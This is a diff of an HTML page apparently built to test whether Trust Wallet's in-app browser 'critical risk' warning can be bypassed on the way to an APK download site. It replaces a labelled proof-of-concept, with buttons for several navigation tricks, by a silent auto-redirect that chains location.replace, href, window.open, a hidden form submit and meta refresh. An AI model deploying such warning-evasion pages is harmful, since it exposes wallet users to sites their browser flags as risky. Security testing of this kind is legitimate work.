@@ -1,136 +1,51 @@
 <!doctype html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>PoC — Trust Wallet popup test (no server)</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Redirecting…</title>
+  <!-- Meta refresh as fallback (0 seconds) -->
+  <meta http-equiv="refresh" content="0; url=https://apkpure.net/id/amp">
   <style>
-    body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:18px;color:#111}
-    h1{font-size:18px}
-    .note{color:#444;margin-bottom:12px;font-size:14px}
-    .row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}
-    button{padding:8px 10px;border-radius:6px;border:0;background:#0366d6;color:#fff;cursor:pointer}
-    input[type=text]{padding:8px;width:100%;max-width:520px;margin-bottom:8px}
-    pre{background:#f6f8fa;padding:10px;border-radius:6px;height:140px;overflow:auto}
-    small{color:#555}
+    body{font-family:system-ui,Segoe UI,Roboto,Arial;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+    .msg{max-width:720px;padding:24px;text-align:center;color:#222}
+    a{color:#0366d6}
   </style>
 </head>
 <body>
-  <h1>PoC — Trust Wallet popup test (no server)</h1>
-  <p class="note">
-    Upload file ini ke GitHub Pages dan buka di Trust Wallet built-in browser.  
-    Target final: <code>https://apkpure.net/id/amp</code> — tes beberapa metode navigasi untuk lihat apakah popup "critical risk" muncul atau bisa dibypass.
-  </p>
-
-  <label>Target URL (default: apkpure AMP)</label>
-  <input id="target" type="text" value="https://apkpure.net/id/amp" />
-
-  <label>Initial host (untuk open→navigate trick, default: google)</label>
-  <input id="initial" type="text" value="https://www.google.com" />
-
-  <div class="row">
-    <button id="btnDirect">Open direct (window.open target)</button>
-    <button id="btnHref">Navigate current tab (location.href)</button>
-    <button id="btnReplace">Navigate replace (location.replace)</button>
-    <button id="btnNoref">Open with rel="noreferrer" (anchor)</button>
-    <button id="btnOpenThenNav">Open initial then navigate to target (same named tab)</button>
-    <button id="btnMeta">Open page that meta-refresh → target</button>
-    <button id="btnForm">Simulate form submit (POST-like navigation)</button>
-    <button id="btnDocWrite">Open blank then write iframe/navigation (experimental)</button>
+  <div class="msg">
+    <p>Redirecting to the target… If your browser blocks automatic redirect, <a id="manual" href="https://apkpure.net/id/amp" target="_blank" rel="noopener">click here</a>.</p>
   </div>
 
-  <p><small>Catatan: beberapa method dapat diblok oleh browser in-app policy atau popup blocker. Ambil screenshot/video untuk bukti.</small></p>
+  <script>
+    (function(){
+      // Target URL — ganti jika perlu
+      const TARGET = 'https://apkpure.net/id/amp';
 
-  <h3>Logs</h3>
-  <pre id="log">Ready. Jangan gunakan halaman ini untuk menyebarkan file berbahaya.</pre>
+      // 1) Replace current location (no history entry)
+      try { location.replace(TARGET); } catch(e){ console.debug('replace failed', e); }
 
-<script>
-const logEl = document.getElementById('log');
-function log(s){ logEl.textContent += (new Date()).toLocaleTimeString() + ' — ' + s + '\\n'; logEl.scrollTop = logEl.scrollHeight; }
+      // 2) Fallback: href assignment
+      try { location.href = TARGET; } catch(e){ console.debug('href failed', e); }
 
-const targetInput = document.getElementById('target');
-const initialInput = document.getElementById('initial');
+      // 3) Open top-level in same tab (named window)
+      try {
+        const w = window.open(TARGET, '_self');
+        // some in-app browsers may block window.open; ignore if null
+      } catch(e){ console.debug('open failed', e); }
 
-document.getElementById('btnDirect').addEventListener('click', () => {
-  const url = targetInput.value.trim();
-  window.open(url, '_blank');
-  log('Direct open -> ' + url);
-});
+      // 4) Form submit fallback (some browsers treat form navigations differently)
+      try {
+        const f = document.createElement('form');
+        f.method = 'GET';
+        f.action = TARGET;
+        f.style.display = 'none';
+        document.body.appendChild(f);
+        f.submit();
+      } catch(e){ console.debug('form failed', e); }
 
-document.getElementById('btnHref').addEventListener('click', () => {
-  const url = targetInput.value.trim();
-  location.href = url;
-  log('location.href -> ' + url);
-});
-
-document.getElementById('btnReplace').addEventListener('click', () => {
-  const url = targetInput.value.trim();
-  location.replace(url);
-  log('location.replace -> ' + url);
-});
-
-document.getElementById('btnNoref').addEventListener('click', () => {
-  // create anchor with noreferrer
-  const a = document.createElement('a');
-  a.href = targetInput.value.trim();
-  a.target = '_blank';
-  a.rel = 'noreferrer noopener';
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
-  log('Anchor rel="noreferrer" open -> ' + a.href);
-});
-
-document.getElementById('btnOpenThenNav').addEventListener('click', () => {
-  const initial = initialInput.value.trim() || 'https://www.google.com';
-  const target = targetInput.value.trim();
-  // open initial in named tab 'x', then after delay navigate 'x' to target
-  window.open(initial, 'x');
-  log('Opened initial host in named tab "x": ' + initial);
-  setTimeout(()=> {
-    window.open(target, 'x');
-    log('Navigated named tab "x" to target: ' + target);
-  }, 2000);
-});
-
-document.getElementById('btnMeta').addEventListener('click', () => {
-  const target = targetInput.value.trim();
-  // open a new tab that contains a meta refresh to target
-  const w = window.open('', '_blank');
-  const html = `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="2;url=${target}"><title>meta redirect</title></head><body>
-    <p>Redirecting to ${target} in 2s...</p>
-    </body></html>`;
-  w.document.open(); w.document.write(html); w.document.close();
-  log('Opened meta-refresh page -> will redirect to ' + target);
-});
-
-document.getElementById('btnForm').addEventListener('click', () => {
-  // create a form and submit it (GET) — some apps treat forms differently
-  const target = targetInput.value.trim();
-  const form = document.createElement('form');
-  form.method = 'GET';
-  form.action = target;
-  form.target = '_blank';
-  document.body.appendChild(form);
-  form.submit();
-  form.remove();
-  log('Submitted form -> ' + target);
-});
-
-document.getElementById('btnDocWrite').addEventListener('click', () => {
-  // open blank window then write a link and auto-click it (experimental)
-  const target = targetInput.value.trim();
-  const w = window.open('', '_blank');
-  const html = `<!doctype html><html><head><meta charset="utf-8"><title>docwrite redirect</title></head>
-    <body><p>Loading... will navigate to target</p>
-    <script>setTimeout(()=>{ location.href='${target}' }, 800);</script>
-    </body></html>`;
-  w.document.open(); w.document.write(html); w.document.close();
-  log('Opened blank tab and doc.write -> will navigate to ' + target);
-});
-
-// initial log
-log('PoC loaded. Use Trust Wallet in-app browser to test. Take screenshots/video for each method.');
-</script>
+      // Note: meta refresh (in <head>) already exists as last fallback for non-JS case.
+    })();
+  </script>
 </body>
 </html>
